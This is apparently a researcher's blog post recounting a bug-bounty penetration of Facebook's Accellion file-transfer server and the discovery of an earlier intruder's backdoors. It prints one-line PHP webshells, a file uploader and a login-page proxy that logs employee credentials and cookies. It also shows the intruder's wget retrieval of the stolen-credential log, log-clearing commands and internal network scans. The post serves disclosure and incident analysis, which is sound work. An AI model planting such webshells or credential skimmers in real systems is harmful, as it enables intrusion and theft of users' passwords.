&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;

&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it’s way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;

&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;

&lt;p&gt;With the growing popularity of Facebook around the world, I’ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;From a pentester’s view, I tend to start from recon and do some research. First, I’ll determine how large is the “territory” of the company on the internet, then…try to find a nice entrance to get in, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
  &lt;li&gt;…etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;

&lt;p&gt;Here I’d like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;For most enterprises, “&lt;strong&gt;Network Boundary&lt;/strong&gt;” is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it’s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That’s why luck is often on the attacker’s side: a vulnerable server on the “border” is enough to grant a ticket to the internal network!&lt;/li&gt;
  &lt;li&gt;Lack of awareness in “&lt;strong&gt;Networking Equipment&lt;/strong&gt;” protection. Most networking equipment doesn’t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
  &lt;li&gt;Security of people: now we have witnessed the emergence of the “&lt;strong&gt;Breached Database&lt;/strong&gt;” (aka “&lt;strong&gt;Social Engineering Database&lt;/strong&gt;” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW seemed to stand for “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;”&lt;br /&gt;
Then I found bellow server through public data&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;WOW. When I accessed vpn.tfbnw.net there’s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited…nevertheless, it brought up the beginning of the following story.&lt;/p&gt;

&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Let’s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;

&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
&lt;em&gt;↑ Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Transfer (hereafter known as FTA)&lt;/p&gt;

&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;

&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7’s Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;”. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;

&lt;p&gt;Actually, from black-box testing, I didn’t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;

&lt;p&gt;The FTA Product&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it’s gonna be messy…&lt;/p&gt;

&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T&lt;br /&gt;
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;

&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;↑ Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;

&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
  &lt;li&gt;Remote Syslog server&lt;/li&gt;
  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;

&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;

&lt;p&gt;First of all I found some strange PHP error messages in “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;”&lt;br /&gt;
These error messages seemed to be caused by modifying codes online?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous “visitors”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first few ones were typical PHP one-line backdoor and there’s one exception: “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;In include_once “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;

&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that’s kinda cheap…XD)&lt;/p&gt;

&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly “&lt;strong&gt;@fb.com&lt;/strong&gt;” and “&lt;strong&gt;@facebook.com&lt;/strong&gt;”. Upon seeing it I thought it’s a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetration…&lt;/p&gt;

&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
  &lt;li&gt;When the hacker was sending out commands, he didn’t take care of STDERR, and left a lot of command error messages in web log which the hacker’s operations could be seen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Packing files&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD
&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to access internal server &lt;br /&gt;
(Looked like Mail OWA could be accessed directly…)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
